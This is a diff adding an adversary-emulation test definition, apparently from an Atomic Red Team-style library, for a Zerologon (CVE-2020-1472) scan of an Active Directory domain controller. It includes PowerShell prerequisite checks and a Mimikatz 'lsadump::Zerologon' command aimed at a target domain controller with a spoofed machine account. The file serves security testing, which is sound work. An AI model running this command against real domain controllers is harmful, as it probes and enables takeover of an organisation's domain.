@@ -1,0 +1,55 @@
+attack_technique: T1210
+display_name: "Exploitation of Remote Services"
+atomic_tests:
+- name: Zerologon scan (Active Directory)
+  auto_generated_guid: 097c8341-95f7-4809-a96b-74f7c89f94e4
+  description: |
+    The Zerologon vulnerability (CVE-2020-1472) consists in an elevation of privilege when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC).
+    This module will test the cryptographic flaw in the protocol against a domain controller. 
+    Privileges required: none, this vulnerability can be exploited pre-authentication. However for test purposes, the machine should be domain-joined.
+    [Reference](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)
+  supported_platforms:
+    - windows
+  input_arguments:
+    mimikatz_path:
+      description: Mimikatz windows executable
+      type: Path
+      default: '%tmp%\mimikatz\x64\mimikatz.exe'
+    target_dc:
+      description: Domain Controller to target
+      type: string
+      default: DC.DOMAIN.CORP
+    spoofed_server_account:
+      description: Server account to spoof
+      type: string
+      default: DC$
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
+      The computer must be domain-joined.
+    prereq_command: |
+      if (Test-Path "#{mimikatz_path}") {
+        Write-Host "OK: Mimikatz executable was found"
+      } else {
+        Write-Host "NOK: Mimikatz executable was not found"
+        exit 1
+      }
+
+      if ((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {
+        Write-Host "OK: the computer is joined to the domain"
+      } else {
+        Write-Host "NOK: the computer is not joined to the domain"
+        exit 1
+      }
+
+      # If everything goes well
+      exit 0
+    get_prereq_command: |
+      Write-Host "1. This computer must be manually joined to the targeted domain"
+      Write-Host "2. The binary of Mimikatz must be present on the system (https://github.com/gentilkiwi/mimikatz/releases)"
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      #{mimikatz_path} "lsadump::Zerologon /target:#{target_dc} /account:#{spoofed_server_account} /null /ntlm /computername:$(Get-Random)" "exit"
